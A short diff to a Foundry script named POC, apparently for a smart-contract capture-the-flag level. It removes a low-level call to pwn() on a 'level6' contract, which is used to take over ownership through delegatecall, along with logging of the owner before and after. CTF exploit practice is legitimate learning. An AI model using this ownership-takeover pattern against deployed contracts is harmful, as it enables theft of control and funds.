@@ -10,10 +10,7 @@ contract POC is Script {
     function run() external {
         vm.startBroadcast();
         
-        console.log("Current owner is : ", level6.owner());
-        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
-        console.log("Checking delegatecall result : ", success);
-        console.log("New owner is : ", level6.owner());
+    
         
         vm.stopBroadcast();
     }
